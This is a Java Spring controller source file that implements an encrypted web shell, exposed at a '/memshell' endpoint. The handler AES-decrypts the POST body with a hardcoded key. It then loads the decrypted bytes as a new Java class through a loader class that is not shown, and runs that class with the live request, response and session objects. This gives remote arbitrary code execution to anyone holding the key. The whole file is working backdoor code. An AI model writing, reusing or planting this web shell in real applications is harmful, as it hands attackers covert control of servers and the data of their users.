package com.test.sp;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.util.HashMap;
import java.util.Map;

@Controller
public class Test{
    private final String k = "e45e329feb5d925b";

    @RequestMapping("/memshell")
    @ResponseBody
    public Object test(HttpServletRequest request, HttpSession sessoin, HttpServletResponse response) throws Exception {
        if(request.getMethod().equals("POST")){
            sessoin.setAttribute("u",this.k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2,new SecretKeySpec(this.k.getBytes(),"AES"));

            String b64String = request.getReader().readLine();
            byte[] bytesEncrypt = new sun.misc.BASE64Decoder().decodeBuffer(b64String);
            byte[] bytesDecrypt = c.doFinal(bytesEncrypt);
            Class newClass = new U(this.getClass().getClassLoader()).g(bytesDecrypt);

            Map<String,Object> pageContext = new HashMap<String,Object>();
            pageContext.put("session",sessoin);
            pageContext.put("request",request);
            pageContext.put("response",response);
            newClass.newInstance().equals(pageContext);
        }
        return response;
    }
    @RequestMapping("/shell")
    public String shell(){
        return "shell";
    }
}
